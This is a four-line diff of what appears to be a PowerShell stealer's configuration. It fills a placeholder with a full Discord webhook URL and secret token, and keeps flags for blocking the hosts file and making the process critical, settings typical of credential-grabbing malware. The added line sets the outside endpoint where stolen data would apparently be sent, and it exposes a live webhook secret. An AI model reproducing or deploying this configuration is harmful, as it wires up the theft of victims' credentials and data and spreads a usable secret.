@@ -1,4 +1,4 @@
-$webhook = "YOUR_WEBHOOK_HERE" 
+$webhook = "https://canary.discord.com/api/webhooks/1260059973925212200/ZUsu2uaVKZy3vCerlr5q7qbrvOdczKifXoqCs76D42reXVhPFWPMXekXs3NSJ-HgYq9m" 
 $debug = $false
 $blockhostsfile = $true
 $criticalprocess = $true
